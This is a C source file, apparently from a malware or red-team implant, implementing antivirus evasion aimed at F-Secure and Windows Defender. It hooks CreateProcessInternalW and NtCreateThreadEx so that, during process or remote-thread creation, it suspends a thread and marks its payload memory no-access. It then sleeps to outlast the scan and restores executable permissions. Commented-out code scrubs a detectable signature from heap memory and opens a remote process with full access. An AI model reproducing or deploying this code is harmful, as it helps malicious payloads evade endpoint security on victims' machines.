#include "anti_av_fsecure_customhooks.h"
#include "global_config.h"

#include "functions_table.h"

#include "debug.h"


extern PCreateProcessInternalW CreateProcessInternalW;
extern PNtCreateThreadEx NtCreateThreadEx;

extern PBYTE detectableSignature;

LPHOOK_RESULT createProcessHookResult;
LPHOOK_RESULT createRemoteThreadHookResult;

HANDLE to_be_scanned_Thread;

ALLOCATED_ADDRESSES_RESULT allocatedAddresses;

BOOL
WINAPI
hookCreateProcessInternalW(HANDLE hToken,
	LPCWSTR lpApplicationName,
	LPWSTR lpCommandLine,
	LPSECURITY_ATTRIBUTES lpProcessAttributes,
	LPSECURITY_ATTRIBUTES lpThreadAttributes,
	BOOL bInheritHandles,
	DWORD dwCreationFlags,
	LPVOID lpEnvironment,
	LPCWSTR lpCurrentDirectory,
	LPSTARTUPINFOW lpStartupInfo,
	LPPROCESS_INFORMATION lpProcessInformation,
	PHANDLE hNewToken)
{
	BOOL res = FALSE;
	restoreHook(createProcessHookResult);
	createProcessHookResult = NULL;

	DBG_MSG("hookCreateProcessInternalW() - called\n");

	LPVOID options = makeProcessOptions(hToken, lpApplicationName, lpCommandLine, lpProcessAttributes, lpThreadAttributes, bInheritHandles, dwCreationFlags, lpEnvironment, lpCurrentDirectory, lpStartupInfo, lpProcessInformation, hNewToken);

	HANDLE thread = l_CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)createProcessNinja, options, 0, NULL);

	DBG_MSG("hookCreateProcessInternalW() - [!] Waiting for createProcessNinja() thread to finish\n");
	l_WaitForSingleObject(thread, INFINITE);

	l_GetExitCodeThread(thread, (LPDWORD)&res);

	DBG_MSG("hookCreateProcessInternalW() - [!] Thread createProcessNinja() finished.\n");

	l_CloseHandle(thread);

	createProcessHookResult = installHook(CreateProcessInternalW, hookCreateProcessInternalW, 5);

	return res;
}

BOOL createProcessNinja(LPVOID options) {
	LPPROCESS_OPTIONS processOptions = (LPPROCESS_OPTIONS)options;

	DBG_MSG("createProcessNinja() - Thread Handle: 0x%p\n", to_be_scanned_Thread);


	if (l_SuspendThread(to_be_scanned_Thread) != -1) {
		DBG_MSG("createProcessNinja() - [!] Suspended thread \n");
	}
	else {
		DBG_MSG("createProcessNinja() - Couldnt suspend thread: %d\n", l_GetLastError());
	}


	setPermissions(allocatedAddresses.arr, allocatedAddresses.dwSize, PAGE_NOACCESS);

	BOOL res = CreateProcessInternalW(processOptions->hToken,
		processOptions->lpApplicationName,
		processOptions->lpCommandLine,
		processOptions->lpProcessAttributes,
		processOptions->lpThreadAttributes,
		processOptions->bInheritHandles,
		processOptions->dwCreationFlags,
		processOptions->lpEnvironment,
		processOptions->lpCurrentDirectory,
		processOptions->lpStartupInfo,
		processOptions->lpProcessInformation,
		processOptions->hNewToken);

	DBG_MSG("createProcessNinja() - Sleep a little to bypass Windows Defender Scan time.\n");
	l_Sleep(10000);

	if (setPermissions(allocatedAddresses.arr, allocatedAddresses.dwSize, PAGE_EXECUTE_READWRITE)) {
		DBG_MSG("createProcessNinja() - ALL OK, resuming thread\n");

		l_ResumeThread(to_be_scanned_Thread);
	}
	else {
		DBG_MSG("createProcessNinja() - [X] Coundn't revert permissions back to normal\n");
	}

	l_HeapFree(l_GetProcessHeap(), HEAP_GENERATE_EXCEPTIONS, processOptions);
	return res;
}


NTSTATUS
NTAPI
hookCreateRemoteThreadEx(
	_Out_ PHANDLE ThreadHandle,
	_In_ ACCESS_MASK DesiredAccess,
	_In_opt_ POBJECT_ATTRIBUTES ObjectAttributes,
	_In_ HANDLE ProcessHandle,
	_In_ PVOID StartRoutine,
	_In_opt_ PVOID Argument,
	_In_ ULONG CreateFlags,
	_In_opt_ ULONG_PTR ZeroBits,
	_In_opt_ SIZE_T StackSize,
	_In_opt_ SIZE_T MaximumStackSize,
	_In_opt_ PVOID AttributeList)
{
	DBG_MSG("hookCreateRemoteThreadEx() - called.\n");
	restoreHook(createRemoteThreadHookResult);
	createRemoteThreadHookResult = NULL;

	DBG_MSG("hookCreateRemoteThreadExProcess() - Handle 0x%p\n", l_GetProcessId(ProcessHandle));
	DBG_MSG("hookCreateRemoteThreadExCurrent() - Process Handle 0x%p\n", l_GetCurrentProcessId());

	NTSTATUS res = 0;

	if (l_GetProcessId(ProcessHandle) != l_GetCurrentProcessId()) {
		LPVOID options = makeThreadOptions(ThreadHandle, DesiredAccess, ObjectAttributes, ProcessHandle, StartRoutine, Argument, CreateFlags, ZeroBits, StackSize, MaximumStackSize, AttributeList);
		HANDLE thread = l_CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)createRemoteThreadNinja, options, 0, NULL);

		DBG_MSG("hookCreateRemoteThreadExProcess() - [!] Waiting for thread to finish\n");
		l_WaitForSingleObject(thread, INFINITE);
		l_GetExitCodeThread(thread, (LPDWORD)&res);
		DBG_MSG("hookCreateRemoteThreadExProcess() - [!] Thread finished\n");

		l_CloseHandle(thread);
	}
	else {
		res = NtCreateThreadEx(ThreadHandle, DesiredAccess, ObjectAttributes, ProcessHandle, StartRoutine, Argument, CreateFlags, ZeroBits, StackSize, MaximumStackSize, AttributeList);
	}

	createRemoteThreadHookResult = installHook(NtCreateThreadEx, hookCreateRemoteThreadEx, 5);
	DBG_MSG("hookCreateRemoteThreadExProcess() - [!] Result is: 0x%p\n", res);
	return res;
}


NTSTATUS createRemoteThreadNinja(LPVOID options) {
	LPTHREAD_OPTIONS threadOptions = (LPTHREAD_OPTIONS)options;

	DBG_MSG("createRemoteThreadNinja() - Thread Handle: 0x%p\n", to_be_scanned_Thread);
	// DBG_MSG("Here I am!!\n");


	if (l_SuspendThread(to_be_scanned_Thread) != -1) {
		DBG_MSG("createRemoteThreadNinja() - [!] Suspended thread \n");
	}
	else {
		DBG_MSG("createRemoteThreadNinja() - Couldnt suspend thread: %d\n", l_GetLastError());
	}

	DWORD oldDummy;

	/*
	l_VirtualProtect(detectableSignature, 0x1000, PAGE_READWRITE, &oldDummy);

	SIGNATURE sig;
	sig.signature = (LPBYTE)detectableSignature;
	sig.sigSize = 20;



	PATTERN_RESULT patternRes = { 0 };
	patternRes.sigs = (PSIZE_T)calloc(sizeof(SIZE_T) * 10);

	PHANDLE heapBuff = (PHANDLE)calloc(sizeof(HANDLE) * 10);

	DWORD heapNum = l_GetProcessHeaps(10, heapBuff);

	for (DWORD heapIndex = 0; heapIndex < heapNum; heapIndex++) {
		DBG_MSG("createRemoteThreadNinja() - Iterating %d, heap\n", heapIndex);
		HANDLE heap = heapBuff[heapIndex];

		DBG_MSG("createRemoteThreadNinja() - BUG-1 \n");
		// HeapLock(heap);

		PROCESS_HEAP_ENTRY heapEntry;

		SecureZeroMemory(&heapEntry, sizeof(PROCESS_HEAP_ENTRY));

		heapEntry.lpData = NULL;

		while (l_HeapWalk(heap, &heapEntry)) {
			if ((heapEntry.wFlags & PROCESS_HEAP_ENTRY_BUSY) && heapEntry.cbData > 0) 
			{
				DBG_MSG("createRemoteThreadNinja() - BUG-2 \n");

				patternScanEx((SIZE_T)heapEntry.lpData, heapEntry.cbData, "xxxxxxxxxxxxxxxxxxxx", &sig, &patternRes, 10);

				DBG_MSG("createRemoteThreadNinja() - BUG-3 \n");
				
				if (patternRes.size > 0) 
				{
					DBG_MSG("createRemoteThreadNinja() - BUG-4 \n");
					SecureZeroMemory(heapEntry.lpData, heapEntry.cbData);
					DBG_MSG("createRemoteThreadNinja() - Flags of heap entry: 0x%p, index: 0x%p\n", heapEntry.wFlags, heapEntry.iRegionIndex);
				}
			}
		}

		// HeapUnlock(heap);
	}

	free(heapBuff);
	*/

	setPermissions(allocatedAddresses.arr, allocatedAddresses.dwSize, PAGE_NOACCESS);

	/*
	searchWholeThing(&sig);

	if (!l_VirtualProtect(detectableSignature, 0x1000, PAGE_NOACCESS, &oldDummy)) {
		DBG_MSG("createRemoteThreadNinja() - [X] virtual protected sig failed %d\n", l_GetLastError());
	}

	printMemoryInfo(detectableSignature);
	

	HANDLE elevatedHandle = NULL;

	if (!l_DuplicateHandle(l_GetCurrentProcess(), threadOptions->ProcessHandle, l_GetCurrentProcess(), &elevatedHandle, PROCESS_ALL_ACCESS, FALSE, 0)) {
		DBG_MSG("createRemoteThreadNinja() - [FAILED] Couldn't duplicate HANDLE, %d", l_GetLastError());
	}

	MEMORY_BASIC_INFORMATION info = { 0 };


	if (!l_VirtualQueryEx(elevatedHandle, threadOptions->StartRoutine, &info, sizeof(MEMORY_BASIC_INFORMATION))) {
		DBG_MSG("createRemoteThreadNinja() - VirtualQueryEx FAILED \n");
	}

	DBG_MSG("createRemoteThreadNinja() - BaseAddress -> 0x%p\n", (DWORD)info.BaseAddress);
	DBG_MSG("createRemoteThreadNinja() - AllocationBase -> 0x%p\n", (DWORD)info.AllocationBase);
	DBG_MSG("createRemoteThreadNinja() - AllocationProtect -> 0x%p\n", (DWORD)info.AllocationProtect);
	DBG_MSG("createRemoteThreadNinja() - RegionSize -> 0x%p\n", (DWORD)info.RegionSize);
	DBG_MSG("createRemoteThreadNinja() - State -> 0x%p\n", (DWORD)info.State);
	DBG_MSG("createRemoteThreadNinja() - Protect -> 0x%p\n", (DWORD)info.Protect);
	DBG_MSG("createRemoteThreadNinja() - Type -> 0x%p\n", (DWORD)info.Type);

	BOOL memPrivate = info.Type == MEM_PRIVATE;

	DWORD oldProtect, dummy;

	LPVOID buffer = calloc(1, info.RegionSize);

	LPVOID copyBuff = l_VirtualAlloc(NULL, info.RegionSize, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);

	DWORD bytesWritten;
	DWORD bytesRead;


	if (memPrivate) {
		DBG_MSG("createRemoteThreadNinja() - MEM_PRIVATE found!\n");

		if (!l_VirtualProtectEx(elevatedHandle, (LPVOID)info.AllocationBase, info.RegionSize, PAGE_NOACCESS, &oldProtect)) {
			DBG_MSG("createRemoteThreadNinja() - First protect failed %d\n", l_GetLastError());
		}
	}

	free(buffer);
	*/

	DBG_MSG("createRemoteThreadNinja() - Before NtCreateThreadEx\n");

	l_Sleep(3000);

	NTSTATUS res = NtCreateThreadEx(threadOptions->ThreadHandle,
		threadOptions->DesiredAccess,
		threadOptions->ObjectAttributes,
		threadOptions->ProcessHandle,
		threadOptions->StartRoutine,
		threadOptions->Argument,
		threadOptions->CreateFlags | CREATE_SUSPENDED,
		threadOptions->ZeroBits,
		threadOptions->StackSize,
		threadOptions->MaximumStackSize,
		threadOptions->AttributeList);

	DBG_MSG("createRemoteThreadNinja() - Made call to NtCreateThreadEx\n");

	DBG_MSG("createRemoteThreadNinja() - Sleep a little to bypass Windows Defender Scan time.\n");
	l_Sleep(10000);

	DBG_MSG("createRemoteThreadNinja() - Restoring remote thread!\n");

	/*
	if (memPrivate) {
		if (!l_VirtualProtectEx(elevatedHandle, (LPVOID)info.AllocationBase, info.RegionSize, PAGE_EXECUTE_READWRITE, &oldProtect)) {
			DBG_MSG("createRemoteThreadNinja() - First protect failed %d\n", l_GetLastError());
		}
		DBG_MSG("createRemoteThreadNinja() - OK restored mem\n");
	}

	l_VirtualFree(copyBuff, info.RegionSize, MEM_RELEASE);
	*/

	if (!(threadOptions->CreateFlags & CREATE_SUSPENDED)) {
		DBG_MSG("createRemoteThreadNinja() - Resuming remote thread!!\n");
		l_ResumeThread(threadOptions->ThreadHandle);
	}

	// restoreHeap(&heapArr);
	/*
	if (elevatedHandle != NULL) {
		l_CloseHandle(elevatedHandle);
	}
	*/

	if (setPermissions(allocatedAddresses.arr, allocatedAddresses.dwSize, PAGE_EXECUTE_READWRITE)) {
		DBG_MSG("createRemoteThreadNinja() - ALL OK, resuming thread\n");

		if (l_ResumeThread(to_be_scanned_Thread) != -1) {
			DBG_MSG("createRemoteThreadNinja() - [!] Thread resumed\n");
		}
		else {
			DBG_MSG("createRemoteThreadNinja() - [!] Thread couldn't resume %d\n", l_GetLastError());
		}
	}
	else {
		DBG_MSG("createRemoteThreadNinja() - [X] Coundn't revert permissions back to normal\n");
	}

	//l_HeapFree(l_GetProcessHeap(), HEAP_GENERATE_EXCEPTIONS, threadOptions);

	return res;
}


LPPROCESS_OPTIONS makeProcessOptions(
	HANDLE hToken,
	LPCWSTR lpApplicationName,
	LPWSTR lpCommandLine,
	LPSECURITY_ATTRIBUTES lpProcessAttributes,
	LPSECURITY_ATTRIBUTES lpThreadAttributes,
	BOOL bInheritHandles,
	DWORD dwCreationFlags,
	LPVOID lpEnvironment,
	LPCWSTR lpCurrentDirectory,
	LPSTARTUPINFOW lpStartupInfo,
	LPPROCESS_INFORMATION lpProcessInformation,
	PHANDLE hNewToken
)
{
	LPPROCESS_OPTIONS options = (LPPROCESS_OPTIONS)l_HeapAlloc(l_GetProcessHeap(), HEAP_GENERATE_EXCEPTIONS, sizeof(PROCESS_OPTIONS));

	options->hToken = hToken;
	options->lpApplicationName = lpApplicationName;
	options->lpCommandLine = lpCommandLine;
	options->lpProcessAttributes = lpProcessAttributes;
	options->lpThreadAttributes = lpThreadAttributes;
	options->bInheritHandles = bInheritHandles;
	options->dwCreationFlags = dwCreationFlags;
	options->lpEnvironment = lpEnvironment;
	options->lpCurrentDirectory = lpCurrentDirectory;
	options->lpStartupInfo = lpStartupInfo;
	options->lpProcessInformation = lpProcessInformation;
	options->hNewToken = hNewToken;

	return options;
}


LPTHREAD_OPTIONS makeThreadOptions(
	_Out_ PHANDLE ThreadHandle,
	_In_ ACCESS_MASK DesiredAccess,
	_In_opt_ POBJECT_ATTRIBUTES ObjectAttributes,
	_In_ HANDLE ProcessHandle,
	_In_ PVOID StartRoutine,
	_In_opt_ PVOID Argument,
	_In_ ULONG CreateFlags,
	_In_opt_ ULONG_PTR ZeroBits,
	_In_opt_ SIZE_T StackSize,
	_In_opt_ SIZE_T MaximumStackSize,
	_In_opt_ PVOID AttributeList
)
{
	LPTHREAD_OPTIONS options = (LPTHREAD_OPTIONS)l_HeapAlloc(l_GetProcessHeap(), HEAP_GENERATE_EXCEPTIONS, sizeof(THREAD_OPTIONS));

	options->ThreadHandle = ThreadHandle;
	options->DesiredAccess = DesiredAccess;
	options->ObjectAttributes = ObjectAttributes;
	options->ProcessHandle = ProcessHandle;
	options->StartRoutine = StartRoutine;
	options->Argument = Argument;
	options->CreateFlags = CreateFlags;
	options->ZeroBits = ZeroBits;
	options->StackSize = StackSize;
	options->MaximumStackSize = MaximumStackSize;
	options->AttributeList = AttributeList;
	return options;
}